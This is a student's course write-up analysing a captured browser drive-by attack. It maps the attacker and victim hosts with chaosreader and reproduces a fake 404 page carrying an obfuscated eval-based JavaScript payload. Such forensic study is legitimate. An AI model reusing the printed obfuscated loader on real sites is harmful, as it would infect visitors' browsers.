+<h3 id="任务四：Web浏览器遭遇攻击、取证分析"><a href="#任务四：Web浏览器遭遇攻击、取证分析" class="headerlink" title="任务四：Web浏览器遭遇攻击、取证分析"></a>任务四：Web浏览器遭遇攻击、取证分析</h3><p>任务：通过分析给的网络记录文件，回答下列问题：<br>（1）列出在捕获文件中的应用层协议类型，是针对哪个或哪些协议的？<br>（2）列出捕获文件中的 IP 地址、主机名和域名。从这些信息中你能猜出攻击场景的环境配置情况吗？<br>（3）列出所有网页页面，其中哪些页面包含了可疑的、恶意的js脚本，谁在连接这些页面，目的是什么？<br>（4）请给出攻击者执行攻击动作的概要描述。<br>（5）攻击者引入了哪些技巧带来了困难。<br>（6）攻击者的目标是哪个操作系统？哪个软件？哪个漏洞？如何组织？<br> (7)shellcode执行了哪些操作？比较他们之间MD5的差异？<br> (8)在攻击场景中有二进制可执行代码参与吗？目的是什么？<br>1.列出在捕获文件中的应用层协议类型， 你认为攻击是针对哪个或哪些协议的？<br>应用层协议主要有<br>(1)域名系统(DNS)(2)文件传输协议(FTP)：用于实现交互式文件传输功能。(3)超文本传输协议(HTTP)(4)简单网络管理协议(SNMP)<br>攻击的是HTTP协议<br><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521074024207-1364588132.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521074024207-1364588132.png"></p>
+<p>2.列出捕获文件中的 IP 地址、主机名和域名。从这些信息中你能猜出攻击场景的环境配置情况吗？<br>通过统计功能，并在wireshark显示IP地址对应名称.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install chaosreader //安装工具</span><br><span class="line">chaosreader -r suspicious-time.pcap //读取pcap文件，生成一系列的html文件</span><br><span class="line">for i in session_00[0-9]*.http.html; do srcip=`cat &quot;$i&quot; | grep &apos;http:\ &apos; | awk &apos;&#123;print $2&#125;&apos; | cut -d &apos;:&apos; -f1`; dstip=`cat &quot;$i&quot; | grep &apos;http:\ &apos; | awk &apos;&#123;print $4&#125;&apos; | cut -d &apos;:&apos; -f1`; host=`cat &quot;$i&quot; | grep &apos;Host:\ &apos; | sort -u | sed -e &apos;s/Host:\ //g&apos;`; echo &quot;$srcip --&gt; $dstip = $host&quot;; done | sort -u //获取源IP和目的IP，以及域名地址</span><br></pre></td></tr></table></figure></p>
+<p><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521085259991-913479387.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521085259991-913479387.png"></p>
+<table>
+<thead>
+<tr>
+<th>IP地址</th>
+<th>域名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>192.168.56.50</td>
+<td>rapidshare.com.eyu32.ru</td>
+</tr>
+<tr>
+<td>192.168.56.51</td>
+<td>shop.honeynet.sg</td>
+</tr>
+<tr>
+<td>192.168.56.52</td>
+<td>sploitme.com.cn</td>
+</tr>
+</tbody>
+</table>
+<p>受害机IP地址：10.20.2.15，10.20.3.15，10.20.4.15，10.20.5.1<br>攻击机为192.168.56.52<br>3.列出捕获文件中的所有网页页面， 其中哪些页面包含了可疑的、可能是恶意的JavaScript 脚本代码？谁在连接这些页面？请描述恶意网页的攻击目的？<br><code>file:///home/kali/Desktop/web/index.html</code>看一下哪个文件大就可疑<br><code>session_0006.part_01.html</code>页面如下，后面也有很多和这个页面大致相同的。获取用户用户名和口令的钓鱼页面：<br><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521090551178-1759942540.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521090551178-1759942540.png"></p>
+<p><code>session_0006.part_01.html</code>后面也有很多和这个页面大致相同的<br>页面如下：</p>
+<p><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521090727170-296431750.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521090727170-296431750.png"><br>文件很大却只是NOT FOUND显然十分可以，查看源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;meta name=&quot;robots&quot; content=&quot;noindex&quot;&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL /fg/show.php?s=3feb5a6b2f was not found on this server.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language=&apos;JavaScript&apos;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">var CRYPT=&#123;signature:&apos;CGerjg56R&apos;,_keyStr:&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&apos;,decode:function(input)&#123;var output=&apos;&apos;;var chr1,chr2,chr3;var enc1,enc2,enc3,enc4;var i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,&apos;&apos;);while(i&lt;input.length)&#123;enc1=this._keyStr.indexOf(input.charAt(i++));enc2=this._keyStr.indexOf(input.charAt(i++));enc3=this._keyStr.indexOf(input.charAt(i++));enc4=this._keyStr.indexOf(input.charAt(i++));chr1=(enc1&lt;&lt;2)|(enc2&gt;&gt;4);chr2=((enc2&amp;15)&lt;&lt;4)|(enc3&gt;&gt;2);chr3=((enc3&amp;3)&lt;&lt;6)|enc4;output=output+String.fromCharCode(chr1);if(enc3!=64)&#123;output=output+String.fromCharCode(chr2);&#125;</span><br><span class="line">if(enc4!=64)&#123;output=output+String.fromCharCode(chr3);&#125;&#125;</span><br><span class="line">output=CRYPT._utf8_decode(output);return output;&#125;,_utf8_decode:function(utftext)&#123;var string=&apos;&apos;;var i=0;var c=0,c1=0,c2=0,c3=0;while(i&lt;utftext.length)&#123;c=utftext.charCodeAt(i);if(c&lt;128)&#123;string+=String.fromCharCode(c);i++;&#125;else if((c&gt;191)&amp;&amp;(c&lt;224))&#123;c2=utftext.charCodeAt(i+1);string+=String.fromCharCode(((c&amp;31)&lt;&lt;6)|(c2&amp;63));i+=2;&#125;else&#123;c2=utftext.charCodeAt(i+1);c3=utftext.charCodeAt(i+2);string+=String.fromCharCode(((c&amp;15)&lt;&lt;12)|((c2&amp;63)&lt;&lt;6)|(c3&amp;63));i+=3;&#125;&#125;</span><br><span class="line">return string;&#125;,obfuscate:function(str)&#123;var container=&apos;&apos;;for(var i=0,z=0;i&lt;str.length;i=i+3,z++)&#123;container+=String.fromCharCode(str.substring(i,i+3)-this.signature.substring(z%this.signature.length,z%this.signature.length+1).charCodeAt(0));&#125;</span><br><span class="line">return CRYPT.decode(container);&#125;&#125;</span><br><span class="line">eval(CRYPT.obfuscate(&apos;157181187231195154135166180117123204195156160169153153187179201185191214128142198189161189196191200140103190165122187162181170153169180117149205214177211171152187120182200223192212126122130170144210184211201104140130146180175229195190106168156188190222191174168172129166183128168223196152151163160115168188171223176122132193157158179228189189118165157155187151203194176156153191153191181201159152151125201122171173188159204104128190166155150231196191152157163154149149211194193161141151124176198223192209153121185172155189192158201140173203143179205192190172157139168137136206189190219110143132137119190164209214143137190122171173188159204104128190166155150231196191152157163154149149211194193161141151124176198223192209153121185172155188222212202162111204165121191162182211157132166136175186200176168158129166183128190164176151142104185178161184222161203125128135168122175222205187102171172155170204201175152130137154149119200184180211152142168175170152195217178137170139156121171162195153156165172150179156216194152110121191175180176186180211152138130124169211200221201120162203157159183163205212105159159134144156213215189173130191124190191201158214126161182137157168187221176158111191157192158236203174110105158177137212213174160163144170149173190201218207154122130187145211187163176158170160156159183225182213127158180176153219212189206165130153157175199186184211128138198188161189183223202103140199157138205231206190173169157151187213204211207174144170136188200223192225152125139184170151200191193141158130147155149219183186126166183118145209214178189174152187133119200224192211132105131175169173192214204104128190167143187235204208119163171154191223204190219110156163179139199164155222151125168115161184217218182172115143&apos;));</span><br><span class="line">//--&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;noscript&gt;&lt;/noscript&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>4.请给出攻击者执行攻击动作的概要描述。<br>用户访问邮件链接rapidshare.com.eyu32.ru/login.php,用户在不知情的情况下进行注册和登录，个人隐私信息会被传送到sploitme.com.cn/?click=XXXX,再重定向到sploitme.com.cn/fg/show.php?s=XXXX，该链接包含恶意javascript代码，同时返回用户一个伪装的404 not found页面，通过检索程序搜索用户主机漏洞，在用户主机上的恶意软件将访问<a href="http://www.honeynet.org。" target="_blank" rel="noopener">www.honeynet.org。</a><br>5.攻击者的目标是哪个操作系统，哪些应用软件，哪些安全漏洞？如何阻止这些攻击？<br>追踪TCP 流，猜测这是一个针对Windows XP系统。<br><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521091549612-1042318110.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521091549612-1042318110.png"></p>
+<h2 id="3-学习中遇到的问题及解决"><a href="#3-学习中遇到的问题及解决" class="headerlink" title="3.学习中遇到的问题及解决"></a>3.学习中遇到的问题及解决</h2><ul>
+<li>问题1：挂马实验文件复杂</li>
+<li>问题1解决方案：查看实验指导书，实现实验</li>
+</ul>
+<h2 id="4-实践总结"><a href="#4-实践总结" class="headerlink" title="4.实践总结"></a>4.实践总结</h2><p>实践很难，好多都不懂，最后一章也是最难的一章。</p>
+
+                </div>
+            </section>
+        </article>
+    </div>
+
+    
+    <div style="height: 4vw;width: 100%"></div>
+    <nav id="gobottom" class="pagination">
+        
+        <a class="prev-post" title="NMP的使用介绍" href="/2019/06/02/NPM的使用/">
+            ← NMP的使用介绍
+        </a>
+        
+        <span class="prev-next-post">•</span>
+        
+        <a class="next-post" title="黄昏" href="/2019/02/22/黄昏/">
+            黄昏 →
+        </a>
+        
+    </nav>
+
+    
+    <div class="inner">
+        <div id="comment"></div>
+    </div>
+    
+</main>
+
+
+<div class="toc-bar">
+    <div class="toc-btn-bar">
+        <a href="#site-main" class="toc-btn">
+            <svg viewbox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M793.024 710.272a32 32 0 1 0 45.952-44.544l-310.304-320a32 32 0 0 0-46.4 0.48l-297.696 320a32 32 0 0 0 46.848 43.584l274.752-295.328 286.848 295.808z"/></svg>
+        </a>
+        <div class="toc-btn toc-switch">
+            <svg class="toc-open" viewbox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M779.776 480h-387.2a32 32 0 0 0 0 64h387.2a32 32 0 0 0 0-64M779.776 672h-387.2a32 32 0 0 0 0 64h387.2a32 32 0 0 0 0-64M256 288a32 32 0 1 0 0 64 32 32 0 0 0 0-64M392.576 352h387.2a32 32 0 0 0 0-64h-387.2a32 32 0 0 0 0 64M256 480a32 32 0 1 0 0 64 32 32 0 0 0 0-64M256 672a32 32 0 1 0 0 64 32 32 0 0 0 0-64"/></svg>
+            <svg class="toc-close hide" viewbox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M512 960c-247.039484 0-448-200.960516-448-448S264.960516 64 512 64 960 264.960516 960 512 759.039484 960 512 960zM512 128.287273c-211.584464 0-383.712727 172.128262-383.712727 383.712727 0 211.551781 172.128262 383.712727 383.712727 383.712727 211.551781 0 383.712727-172.159226 383.712727-383.712727C895.712727 300.415536 723.551781 128.287273 512 128.287273z"/><path d="M557.05545 513.376159l138.367639-136.864185c12.576374-12.416396 12.672705-32.671738 0.25631-45.248112s-32.704421-12.672705-45.248112-0.25631l-138.560301 137.024163-136.447897-136.864185c-12.512727-12.512727-32.735385-12.576374-45.248112-0.063647-12.512727 12.480043-12.54369 32.735385-0.063647 45.248112l136.255235 136.671523-137.376804 135.904314c-12.576374 12.447359-12.672705 32.671738-0.25631 45.248112 6.271845 6.335493 14.496116 9.504099 22.751351 9.504099 8.12794 0 16.25588-3.103239 22.496761-9.247789l137.567746-136.064292 138.687596 139.136568c6.240882 6.271845 14.432469 9.407768 22.65674 9.407768 8.191587 0 16.352211-3.135923 22.591372-9.34412 12.512727-12.480043 12.54369-32.704421 0.063647-45.248112L557.05545 513.376159z"/></svg>
+        </div>
+        <a href="#gobottom" class="toc-btn">
+            <svg viewbox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M231.424 346.208a32 32 0 0 0-46.848 43.584l297.696 320a32 32 0 0 0 46.4 0.48l310.304-320a32 32 0 1 0-45.952-44.544l-286.848 295.808-274.752-295.36z"/></svg>
+        </a>
+    </div>
+    <div class="toc-main">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#总体结构"><span class="toc-text">总体结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-实践内容"><span class="toc-text">1.实践内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-Web浏览器的技术发展和安全威胁"><span class="toc-text">1.1 Web浏览器的技术发展和安全威胁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-实践过程"><span class="toc-text">2.实践过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#任务一：使用攻击机进行浏览器渗透攻击实践。"><span class="toc-text">任务一：使用攻击机进行浏览器渗透攻击实践。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任务二：网站挂马分析实践"><span class="toc-text">任务二：网站挂马分析实践</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任务三：-Web浏览器渗透攻击对抗实验"><span class="toc-text">任务三： Web浏览器渗透攻击对抗实验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任务四：Web浏览器遭遇攻击、取证分析"><span class="toc-text">任务四：Web浏览器遭遇攻击、取证分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-学习中遇到的问题及解决"><span class="toc-text">3.学习中遇到的问题及解决</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-实践总结"><span class="toc-text">4.实践总结</span></a></li></ol>
+    </div>
+</div>
+
+
+
+	</div>
+	
+
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+            
+            
+            
+
+<article class="read-next-card" style="background-image: url(https://banpingcu.github.io/img/header.jpg)">
+    <header class="read-next-card-header" style="padding-bottom: 20px">
+        <h3 class="read-next-card-header-title">类型</h3>
+    </header>
+    <div class="read-next-card-content">
+        <ul>
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/摄影/">摄影</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/计算机/">计算机</a></li></ul>
+
+        </ul>
+    </div>
+</article>
+
+
+            
+            
+            
+
+<article class="read-next-card" style="background-image: url(https://banpingcu.github.io/img/header.jpg)">
+	<header class="read-next-card-header" style="padding-bottom: 20px">
+		<h3 class="read-next-card-header-title">标签</h3>
+	</header>
+	<div class="read-next-card-content-ext">
+		<a href="/tags/C语言/" style="font-size: 24px;">C语言</a> <a href="/tags/Nginx/" style="font-size: 14px;">Nginx</a> <a href="/tags/Node-js/" style="font-size: 14px;">Node.js</a> <a href="/tags/摄影/" style="font-size: 17.33px;">摄影</a> <a href="/tags/新建-模板-小书匠/" style="font-size: 14px;">新建,模板,小书匠</a> <a href="/tags/服务器/" style="font-size: 14px;">服务器</a> <a href="/tags/网络攻防/" style="font-size: 14px;">网络攻防</a> <a href="/tags/网页/" style="font-size: 14px;">网页</a> <a href="/tags/计算机组成原理/" style="font-size: 20.67px;">计算机组成原理</a> <a href="/tags/计算机网络/" style="font-size: 17.33px;">计算机网络</a> <a href="/tags/阳光/" style="font-size: 14px;">阳光</a>
+	</div>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+	
+
+
+
+<div id="search" class="search-overlay subscribe-overlay">
+    <div class="search-form">
+        
+        <img class="search-overlay-logo" src="https://img2020.cnblogs.com/blog/1800791/202009/1800791-20200911095425530-953711724.jpg" alt="醋小虾">
+        
+        <input id="local-search-input" class="search-input" type="text" name="search" placeholder="搜索 ...">
+        <a class="search-overlay-close" href="#"></a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+<footer class="site-footer outer">
+	<div class="site-footer-content inner">
+		<section class="copyright">
+			<a href="/" title="醋小虾">醋小虾</a>
+			&copy; 2020
+		</section>
+		<nav class="site-footer-nav">
+			
+            
+            
+    </nav></div>
+</footer>
+	
+
+
+<script>
+    if(window.navigator && navigator.serviceWorker) {
+        navigator.serviceWorker.getRegistrations()
+        .then(function(registrations) {
+            for(let registration of registrations) {
+                registration.unregister();
+            }
+        });
+    }
+</script>
+
+
+
+
+
+
+
+
+<div class="floating-header">
+	<div class="floating-header-logo">
+        <a href="/" title="醋小虾">
+			
+                <img src="https://img2020.cnblogs.com/blog/1800791/202009/1800791-20200911095425530-953711724.jpg" alt="醋小虾 icon">
+			
+            <span>醋小虾</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">&mdash;</span>
+    <div class="floating-header-title">《网络攻防实践》第12周作业</div>
+    <progress class="progress" value="0">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+
+
+
+<script src="/js/mix/post-lazy-local.min.js"></script>
+
+<script>;(function() {var bLazy = new Blazy()})();</script>
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+<script>
+    lightGallery(document.getElementById('lightgallery'), {
+        selector: '.post-img'
+    });
+</script>
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#comment' ,
+        verify: false,
+        notify: false,
+        appId: '9WD4ifDBAnM3Hq6uExlFM3YP-gzGzoHsz',
+        appKey: 'W5JUxdv9o1jOyXLWICBA2p5h',
+        placeholder: '你就没有什么想说的吗！！',
+        pageSize: 10,
+        avatar: 'mm',
+        visitor: true,
+    });
+</script>
+
+
+
+
+
+
+<script>searchFunc("/")</script>
+
+
+
+
+
+</body>
+</html>
